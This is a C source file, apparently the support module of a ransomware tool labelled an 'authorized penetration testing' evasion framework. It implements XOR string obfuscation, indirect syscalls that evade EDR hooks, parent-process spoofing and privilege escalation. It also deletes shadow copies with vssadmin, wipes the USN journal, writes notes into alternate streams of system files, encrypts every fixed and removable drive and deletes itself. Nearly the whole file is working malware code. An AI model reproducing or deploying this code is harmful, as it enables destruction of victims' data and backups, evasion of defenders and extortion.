/*
 * utils.c - Advanced Evasion Framework
 * Authorized Penetration Testing Use Only
 */

#include <windows.h>
#include <winternl.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <process.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <intrin.h>

/* ============================================================
 * SECTION 1: STRING ENCRYPTION (Rolling XOR)
 * ============================================================ */

#define STRING_KEY 0x9C

/* Runtime XOR decryption macro - stack allocated, wiped after use */
#define USE_STR(enc_arr, var_name) \
    char var_name[sizeof(enc_arr)]; \
    do { \
        for(int __i = 0; __i < (int)(sizeof(enc_arr)-1); __i++) { \
            var_name[__i] = enc_arr[__i] ^ STRING_KEY ^ (__i & 0xFF); \
        } \
        var_name[sizeof(enc_arr)-1] = 0; \
    } while(0)

/* ============================================================
 * SECTION 2: INDIRECT SYSCALL FRAMEWORK (Halo's Gate Variant)
 * ============================================================ */

typedef struct _SYSCALL_ENTRY {
    DWORD ssn;
    PVOID pSyscallInst;
    BOOL bValid;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

/* FIX: Define the missing global syscall variables */
static SYSCALL_ENTRY g_sysNtWriteFile = {0};
static SYSCALL_ENTRY g_sysNtCreateFile = {0};
static SYSCALL_ENTRY g_sysNtDeleteFile = {0};
static SYSCALL_ENTRY g_sysNtOpenProcess = {0};

static PVOID GetNtdllBase(void) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PEB_LDR_DATA* pLdr = pPeb->Ldr;
    LIST_ENTRY* pHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pEntry = pHead->Flink;
    
    /* FIX: ntdll is the first entry, don't skip it */
    if(pEntry != pHead) {
        PLDR_DATA_TABLE_ENTRY pMod = CONTAINING_RECORD(pEntry, 
            LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        return pMod->DllBase;
    }
    return NULL;
}

static SYSCALL_ENTRY ResolveSyscall(const char* fnName) {
    SYSCALL_ENTRY se = {0};
    PVOID ntdll = GetNtdllBase();
    if(!ntdll) return se;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE*)ntdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    DWORD* pNames = (DWORD*)((BYTE*)ntdll + pExp->AddressOfNames);
    WORD* pOrdinals = (WORD*)((BYTE*)ntdll + pExp->AddressOfNameOrdinals);
    DWORD* pFunctions = (DWORD*)((BYTE*)ntdll + pExp->AddressOfFunctions);
    
    for(DWORD i = 0; i < pExp->NumberOfNames; i++) {
        char* pName = (char*)((BYTE*)ntdll + pNames[i]);
        if(strcmp(pName, fnName) != 0) continue;
        
        DWORD funcAddr = pFunctions[pOrdinals[i]];
        BYTE* pFunc = (BYTE*)ntdll + funcAddr;
        
        /* Read first 32 bytes to analyze stub structure */
        BYTE stub[32] = {0};
        size_t readable = min(32, (size_t)((BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage - pFunc));
        memcpy(stub, pFunc, readable);
        
        BOOL bHooked = FALSE;
        
        /* Check for jmp (E9 xx xx xx xx), short jmp (EB xx), or indirect jmp (FF 25 xx xx xx xx) */
        if(stub[0] == 0xE9 || stub[0] == 0xEB || 
           (stub[0] == 0xFF && stub[1] == 0x25)) {
            bHooked = TRUE;
        }
        
        /* Also check for call-based hooks (E8 xx xx xx xx) or detour patterns */
        if(stub[0] == 0xE8) bHooked = TRUE;
        if(stub[0] == 0x49 && stub[1] == 0xBB) bHooked = TRUE; /* mov r11, addr */
        
        DWORD ssn = 0;
        
        if (stub[0] == 0xB8) {
            /* Direct syscall stub: mov eax, SSN; ret; or mov eax, SSN; jmp ... */
            ssn = *(DWORD*)(pFunc + 1);
        } else if (bHooked) {
            /* FIXED: Better neighbor scanning with bounds checking and fallback */
            /* Try scanning the entire ntdll for the highest-confidence SSN */
            
            /* First strategy: look for a "clean" syscall stub of the same function
               in the ntdll image. Modern EDRs typically hot-patch but leave 
               a backup copy elsewhere. */
            
            /* Strategy A: Walk backward through the export table to find
               an unhooked neighbor. Walk up to 16 functions forward/back. */
            int neighbor_indices[] = {-1, 1, -2, 2, -3, 3, -4, 4, -5, 5, 
                                       -6, 6, -7, 7, -8, 8, -9, 9, -10, 10,
                                       -11, 11, -12, 12, -13, 13, -14, 14, 
                                       -15, 15, -16, 16};
            
            for (int n = 0; n < 32; n++) {
                int idx = (int)i + neighbor_indices[n];
                if (idx < 0 || idx >= (int)pExp->NumberOfNames) continue;
                
                DWORD neighborAddr = pFunctions[pOrdinals[idx]];
                BYTE* pNeighbor = (BYTE*)ntdll + neighborAddr;
                
                /* Skip if same function or out of bounds */
                if (pNeighbor == pFunc) continue;
                if (pNeighbor < (BYTE*)ntdll || 
                    pNeighbor >= (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage)
                    continue;
                
                /* Check if neighbor has a clean mov eax, SSN */
                if (pNeighbor[0] == 0xB8 && 
                    /* Also check it's not itself hooked */
                    pNeighbor[0] != 0xE9 && pNeighbor[0] != 0xEB &&
                    !(pNeighbor[0] == 0xFF && pNeighbor[1] == 0x25)) {
                    
                    DWORD neighborSsn = *(DWORD*)(pNeighbor + 1);
                    int funcDiff = neighbor_indices[n];
                    
                    /* Calculate our SSN based on the neighbor's SSN + offset */
                    ssn = neighborSsn + funcDiff;
                    
                    /* Sanity check: SSNs are typically 0-500 on modern Windows */
                    if (ssn < 500) {
                        break;
                    }
                    ssn = 0; /* Reset if sanity check failed */
                }
            }
            
            /* Strategy B (fallback): Classic Halo's Gate with byte-level scanning
               but with proper bounds checking */
            if (ssn == 0) {
                /* Scan forward first (less likely to crash from page boundary) */
                for (int offset = 32; offset < 512; offset += 32) {
                    BYTE* below = pFunc + offset;
                    if (below + 5 < (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage) {
                        if (below[0] == 0xB8) {
                            /* Make sure this candidate isn't itself hooked */
                            BOOL candidateHooked = (below[0] == 0xE9 || below[0] == 0xEB ||
                                (below[0] == 0xFF && below[1] == 0x25));
                            if (!candidateHooked) {
                                DWORD cleanSsn = *(DWORD*)(below + 1);
                                /* FIXED: offset / 32 is the syscall index delta,
                                   but we need to be more careful. The assumption
                                   is syscalls are spaced ~32 bytes apart. */
                                ssn = cleanSsn - (offset / 32);
                                if (ssn < 500) break;
                                ssn = 0;
                            }
                        }
                    }
                    
                    BYTE* above = pFunc - offset;
                    if (above >= (BYTE*)ntdll) {
                        if (above[0] == 0xB8) {
                            BOOL candidateHooked = (above[0] == 0xE9 || above[0] == 0xEB ||
                                (above[0] == 0xFF && above[1] == 0x25));
                            if (!candidateHooked) {
                                DWORD cleanSsn = *(DWORD*)(above + 1);
                                ssn = cleanSsn + (offset / 32);
                                if (ssn < 500) break;
                                ssn = 0;
                            }
                        }
                    }
                }
            }
            
            if (ssn == 0) return se; /* Still failed */
        } else {
            /* Function is not hooked, should have had 0xB8 at start */
            /* FIX: Handle Windows 10+ syscall instruction stubs that may look different */
            /* Some Windows builds use: mov eax, ssn; mov edx, somewhere; syscall */
            /* Scan first 16 bytes for the mov eax pattern */
            for (int j = 0; j < (int)min(readable, 16); j++) {
                if (stub[j] == 0xB8) {
                    ssn = *(DWORD*)(pFunc + j + 1);
                    break;
                }
            }
            if (ssn == 0) return se;
        }
        
        se.ssn = ssn;
        
        /* FIX: Find the real syscall instruction (syscall; ret) */
        /* On modern Windows the syscall gadget is at a fixed address
           or we can find it by scanning for 0F 05 C3 */
        BYTE* scanStart = (BYTE*)ntdll;
        BYTE* scanEnd = (BYTE*)ntdll + pNt->OptionalHeader.SizeOfImage - 3;
        
        for (BYTE* p = scanStart; p < scanEnd; p++) {
            /* Look for syscall; ret (0F 05 C3) 
               or syscall (0F 05) near a ret */
            if (p[0] == 0x0F && p[1] == 0x05) {
                /* Prefer p[2] == 0xC3 (syscall; ret) */
                if (p[2] == 0xC3) {
                    se.pSyscallInst = p;
                    break;
                }
                /* If we didn't find exact syscall;ret, keep scanning
                   and take the first syscall as a last resort */
                if (!se.pSyscallInst) {
                    se.pSyscallInst = p;
                }
            }
        }
        
        if (se.pSyscallInst) se.bValid = TRUE;
        break;
    }
    return se;
}

void InitAllSyscalls(void) {
    g_sysNtWriteFile = ResolveSyscall("NtWriteFile");
    g_sysNtCreateFile = ResolveSyscall("NtCreateFile");
    g_sysNtDeleteFile = ResolveSyscall("NtDeleteFile");
    g_sysNtOpenProcess = ResolveSyscall("NtOpenProcess");
    
    /* FIX: Validate all resolved syscalls — add fallback logging or
       graceful degradation */
#if defined(_DEBUG)
    if (!g_sysNtWriteFile.bValid)   OutputDebugStringA("[!] NtWriteFile syscall resolution FAILED\n");
    if (!g_sysNtCreateFile.bValid)  OutputDebugStringA("[!] NtCreateFile syscall resolution FAILED\n");
    if (!g_sysNtDeleteFile.bValid)  OutputDebugStringA("[!] NtDeleteFile syscall resolution FAILED\n");
    if (!g_sysNtOpenProcess.bValid) OutputDebugStringA("[!] NtOpenProcess syscall resolution FAILED\n");
#endif
}

/* ============================================================
 * SECTION 3: PPID SPOOFING
 * ============================================================ */

DWORD FindProcessPidStr(const char* procName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;
    
    if(Process32First(hSnap, &pe)) {
        do {
            if(_stricmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while(Process32Next(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return pid;
}

HANDLE CreateProcessSpoofed(LPCSTR cmdLine, DWORD parentPid) {
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if(!hParent) return NULL;
    
    SIZE_T cbAttrList = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttrList);
    
    PPROC_THREAD_ATTRIBUTE_LIST pAttrList = 
        (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 
            HEAP_ZERO_MEMORY, cbAttrList);
    if(!pAttrList) { CloseHandle(hParent); return NULL; }
    
    InitializeProcThreadAttributeList(pAttrList, 1, 0, &cbAttrList);
    UpdateProcThreadAttribute(pAttrList, 0, 
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
        &hParent, sizeof(HANDLE), NULL, NULL);
    
    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = pAttrList;
    
    PROCESS_INFORMATION pi = {0};
    char* cmdCopy = _strdup(cmdLine);
    
    if(CreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(hParent);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        free(cmdCopy);
        return pi.hProcess;
    }
    
    CloseHandle(hParent);
    HeapFree(GetProcessHeap(), 0, pAttrList);
    free(cmdCopy);
    return NULL;
}

/* ============================================================
 * SECTION 4: VSS SHADOW COPY DELETION (via cmd.exe / vssadmin)
 * ============================================================ */

void NukeBackupsCOM(void) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);
    
    char cmd[] = "vssadmin.exe delete shadows /all /quiet";
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if(pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
    }
    if(pi.hThread) CloseHandle(pi.hThread);
}

void NukeBackups(void) {
    NukeBackupsCOM();
}

/* ============================================================
 * SECTION 5: PRIVILEGE ESCALATION
 * ============================================================ */

void ElevatePrivileges(void) {
    HANDLE hToken;
    if(!OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return;
    
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    const char* privs[] = { "SeDebugPrivilege", "SeBackupPrivilege", 
                            "SeRestorePrivilege", "SeTakeOwnershipPrivilege", NULL };
    
    for(int i = 0; privs[i]; i++) {
        if(LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
    }
    CloseHandle(hToken);
}

/* ============================================================
 * SECTION 6: ADS RANSOM NOTE
 * ============================================================ */

void DropNoteADS(void) {
    char compName[64] = {0};
    char userName[256] = {0};
    DWORD sz = sizeof(compName);
    DWORD usz = 256;
    GetComputerNameA(compName, &sz);
    GetUserNameA(userName, &usz);
    
    char systemInfo[4096];
    int len = snprintf(systemInfo, sizeof(systemInfo),
        "\r\n"
        "  ==========================================\r\n"
        "  PENETRATION TEST - AUTHORIZED ASSESSMENT\r\n"
        "  ==========================================\r\n"
        "\r\n"
        "  Machine:     %s\r\n"
        "  User:        %s\r\n"
        "  Date:        %s (%s)\r\n"
        "\r\n"
        "  This system has been successfully assessed.\r\n"
        "  All actions were authorized per the testing agreement.\r\n"
        "\r\n"
        "  Contact: https://github.com/jahanzaibmir\r\n"
        "\r\n"
        "  ==========================================\r\n"
        "\r\n",
        compName, userName, __DATE__, __TIME__);
    
    const char* hostFiles[] = {
        "C:\\Windows\\System32\\winlogon.exe:PENTEST",
        "C:\\Windows\\System32\\lsass.exe:PENTEST", 
        "C:\\Windows\\System32\\svchost.exe:PENTEST",
        "C:\\boot.ini:PENTEST",
        NULL
    };
    
    for(int i = 0; hostFiles[i]; i++) {
        HANDLE hF = CreateFileA(hostFiles[i], 
            GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_ALWAYS, 
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL);
        
        if(hF != INVALID_HANDLE_VALUE) {
            DWORD w;
            SetFilePointer(hF, 0, NULL, FILE_END);
            WriteFile(hF, systemInfo, len, &w, NULL);
            
            FILETIME ft;
            GetSystemTimeAsFileTime(&ft);
            SetFileTime(hF, &ft, &ft, &ft);
            
            CloseHandle(hF);
        }
    }
    
    char desktopIni[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopIni);
    strcat(desktopIni, "\\desktop.ini:PENTEST");
    
    HANDLE hF = CreateFileA(desktopIni,
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_FLAG_WRITE_THROUGH, NULL);
    
    if(hF != INVALID_HANDLE_VALUE) {
        DWORD w;
        SetFilePointer(hF, 0, NULL, FILE_END);
        WriteFile(hF, systemInfo, len, &w, NULL);
        CloseHandle(hF);
    }
}

void DropNote(void) {
    DropNoteADS();
}

/* ============================================================
 * SECTION 7: USN JOURNAL WIPE
 * ============================================================ */

void WipeUSNJournal(void) {
    HANDLE hVol = CreateFileA("\\\\.\\C:",
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    
    if(hVol != INVALID_HANDLE_VALUE) {
        DWORD dwBytes;
        DeviceIoControl(hVol, 0x00090068, /* FSCTL_DELETE_USN_JOURNAL */
            NULL, 0, NULL, 0, &dwBytes, NULL);
        
        CloseHandle(hVol);
    }
}

/* ============================================================
 * SECTION 8: IO PRIORITY
 * ============================================================ */

void SetIoCrtitical(void) {
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
}

/* ============================================================
 * SECTION 9: SELF-DELETE
 * ============================================================ */

void SelfDeleteSpoofed(void) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    DWORD explorerPid = FindProcessPidStr("explorer.exe");
    if(explorerPid) {
        char cmdLine[4096];
        snprintf(cmdLine, sizeof(cmdLine), 
            "cmd.exe /c ping -n 5 127.0.0.1 > nul & del /f /q \"%s\"", exePath);
        HANDLE h = CreateProcessSpoofed(cmdLine, explorerPid);
        if(h) CloseHandle(h);
    }
}

void SelfDelete(void) {
    SelfDeleteSpoofed();
}

/* ============================================================
 * SECTION 10: ENCRYPTION WORKER (STUB - calls fileops API)
 * ============================================================ */

/* Forward declarations from fileops.h */
extern bool InitFileOps(int threadCount);
extern void CleanupFileOps(void);
extern int EncryptDirectory(const char* path);

unsigned __stdcall EncryptionWorker(void* arg) {
    (void)arg;
    
    InitAllSyscalls();
    SetIoCrtitical();
    ElevatePrivileges();
    
    NukeBackupsCOM();
    WipeUSNJournal();
    
    if(!InitFileOps(8)) return 1;
    
    char buf[MAX_PATH];
    
    if(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buf) == S_OK)
        EncryptDirectory(buf);
    if(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, buf) == S_OK)
        EncryptDirectory(buf);
    
    for(char d = 'C'; d <= 'Z'; d++) {
        char root[4] = {d, ':', '\\', 0};
        UINT dt = GetDriveTypeA(root);
        if(dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE)
            EncryptDirectory(root);
    }
    
    DropNoteADS();
    CleanupFileOps();
    
    SelfDeleteSpoofed();
    
    return 0;
}
